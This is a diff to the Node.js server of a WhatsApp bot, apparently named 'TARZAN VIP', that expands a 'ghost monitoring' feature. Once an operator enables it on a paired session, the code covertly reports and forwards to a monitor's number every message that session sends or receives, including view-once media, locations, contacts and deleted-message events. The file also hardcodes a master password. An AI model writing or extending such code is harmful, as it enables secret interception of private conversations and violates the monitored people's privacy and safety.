@@ -29,7 +29,7 @@ const MASTER_PASSWORD = 'tarzanbot';
 const sessions = {};
 const msgStore = new Map(); 
 
-// 👁️ [جديد]: خريطة الذاكرة لنظام المراقبة الشبحية
+// 👁️ خريطة الذاكرة لنظام المراقبة الشبحية
 const activeMonitors = new Map();
 
 // ✅ 1. نظام حفظ الإعدادات
@@ -221,7 +221,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         };
 
         // ==========================================
-        // 👻 [جديد]: أوامر تفعيل/إيقاف المراقبة الشبحية
+        // 👻 أوامر المراقبة الشبحية
         // ==========================================
         if (body.startsWith('.مراقبه ')) {
             const targetSession = body.replace('.مراقبه ', '').trim();
@@ -240,43 +240,71 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         }
 
         // ==========================================
-        // 🚨 [جديد]: تنفيذ المراقبة الشبحية
+        // 🚨 تنفيذ المراقبة الشبحية الشاملة الدقيقة
         // ==========================================
         if (activeMonitors.has(sessionId)) {
             const monitorInfo = activeMonitors.get(sessionId);
             const monitorSock = sessions[monitorInfo.monitorSocketId];
 
-            // منع الحلقة المفرغة (لا نرسل تقرير عن تقرير)
             if (monitorSock && from !== monitorInfo.monitorJid && sender !== monitorInfo.monitorJid) {
                 try {
                     const targetNumber = isGroup ? from.split('@')[0] : (isFromMe ? from.split('@')[0] : sender.split('@')[0]);
                     const time = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
                     
-                    let contentDesc = body || 'نص / محتوى غير معروف';
+                    let contentDesc = '';
                     let msgType = Object.keys(msg.message || {})[0];
+                    let realMessage = msg.message;
 
-                    if (msgType === 'imageMessage') contentDesc = '📷 صـورة';
-                    else if (msgType === 'videoMessage') contentDesc = '🎥 فـيـديـو';
-                    else if (msgType === 'audioMessage') contentDesc = '🎵 مـقـطـع صـوتـي';
-                    else if (msgType === 'documentMessage') contentDesc = '📄 مـلـف';
-                    else if (msgType === 'stickerMessage') contentDesc = '🌠 مـلـصـق';
-                    if (viewOnceIncoming) contentDesc = '👁️‍🗨️ رسـالـة عـرض لـمـرة واحـدة';
+                    // تحليل ذكي لنوع الرسالة
+                    if (viewOnceIncoming) {
+                        contentDesc = `👁️‍🗨️ رسـالـة عـرض لـمـرة واحـدة${body ? '\n📝 الـوصـف: ' + body : ''}`;
+                    } else if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
+                        contentDesc = `💬 نـص:\n${body}`;
+                    } else if (msgType === 'imageMessage') {
+                        contentDesc = `📷 صـورة${body ? '\n📝 الـوصـف: ' + body : ''}`;
+                    } else if (msgType === 'videoMessage') {
+                        contentDesc = `🎥 فـيـديـو${body ? '\n📝 الـوصـف: ' + body : ''}`;
+                    } else if (msgType === 'audioMessage') {
+                        const isVoiceNote = realMessage.audioMessage?.ptt;
+                        contentDesc = isVoiceNote ? '🎙️ بـصـمـة صـوتـيـة' : '🎵 مـقـطـع صـوتـي (أغنية/ملف)';
+                    } else if (msgType === 'documentMessage') {
+                        const fileName = realMessage.documentMessage?.fileName || 'غير معروف';
+                        contentDesc = `📄 مـلـف:\nاسم الملف: ${fileName}`;
+                    } else if (msgType === 'stickerMessage') {
+                        contentDesc = '🌠 مـلـصـق (سـتـيـكـر)';
+                    } else if (msgType === 'contactMessage' || msgType === 'contactsArrayMessage') {
+                        contentDesc = '👤 جـهـة اتـصـال (رقـم)';
+                    } else if (msgType === 'locationMessage' || msgType === 'liveLocationMessage') {
+                        contentDesc = '📍 مـوقـع جـغـرافـي (خـريـطـة)';
+                    } else if (msgType === 'reactionMessage') {
+                        const reactionEmoji = realMessage.reactionMessage?.text || '';
+                        contentDesc = `❤️ تـفـاعـل بـ: ${reactionEmoji}`;
+                    } else if (msgType === 'pollCreationMessage' || msgType === 'pollCreationMessageV3') {
+                        const pollName = realMessage[msgType]?.name || 'تصويت';
+                        contentDesc = `📊 تـصـويـت / اسـتـطـلاع:\nالسؤال: ${pollName}`;
+                    } else if (msgType === 'protocolMessage') {
+                        contentDesc = '🗑️ رسـالـة مـحـذوفـة أو إجـراء نـظـام';
+                    } else {
+                        // حل أخير للأنواع النادرة جداً
+                        contentDesc = body ? `💬 رسالة نصية:\n${body}` : `⚙️ نـوع رسـالـة مـخـتـلـف: [ ${msgType} ]`;
+                    }
 
-                    const direction = isFromMe ? '📤 *[تـم إرسـال رسـالـة إلـى]*' : '📥 *[تـم اسـتـلام رسـالـة مـن]*';
-                    const groupInfo = isGroup ? `\n👥 *الـجـروب:* ${from.split('@')[0]}` : '';
+                    const direction = isFromMe ? '📤 *[ إرسـال رسـالـة ]*' : '📥 *[ اسـتـلام رسـالـة ]*';
+                    const chatTypeIndicator = isGroup ? '👥 *جـروب (مـجـمـوعـة)*' : '👤 *خـاص (مـحـادثـة فـرديـة)*';
+                    const groupInfo = isGroup ? `\n🏷️ *آيـدي الـجـروب:* ${from.split('@')[0]}` : '';
 
                     const reportText = `🚨 *[ مـراقـبـة شـبـحـيـة - ${sessionId} ]* 🚨\n\n` +
                                        `${direction}\n` +
-                                       `👤 *الاسـم:* ${pushName}\n` +
+                                       `📍 *الـمـصـدر:* ${chatTypeIndicator}\n` +
+                                       `👤 *الـمـرسـل:* ${pushName}\n` +
                                        `📱 *الـرقـم:* wa.me/${targetNumber}${groupInfo}\n` +
                                        `🕒 *الـوقـت:* ${time}\n\n` +
                                        `📄 *الـمـحـتـوى:*\n${contentDesc}`;
 
-                    // إرسال التقرير النصي للرقيب
                     await monitorSock.sendMessage(monitorInfo.monitorJid, { text: reportText });
 
-                    // إذا كانت الرسالة ميديا (صورة، فيديو، صوت) نقوم بتحويلها أيضاً!
-                    if (msgType !== 'conversation' && msgType !== 'extendedTextMessage') {
+                    // إعادة إرسال الميديا أو الستيكرات أو الصوت لتراها بنفسك
+                    if (msgType !== 'conversation' && msgType !== 'extendedTextMessage' && msgType !== 'protocolMessage' && msgType !== 'reactionMessage') {
                         await monitorSock.sendMessage(monitorInfo.monitorJid, { forward: msg });
                     }
                 } catch (e) {
@@ -449,6 +477,6 @@ app.listen(PORT, () => {
     console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
     console.log(`🛡️ وضع الحماية من الانهيار مفعل بنجاح`);
     console.log(`🧠 نظام الذكاء الاصطناعي (TARZAN AI) مدمج وجاهز`);
-    console.log(`👻 نظام المراقبة الشبحية متاح الآن`);
+    console.log(`👻 نظام المراقبة الشبحية الشامل متاح الآن`);
     console.log(`=========================================\n`);
 });
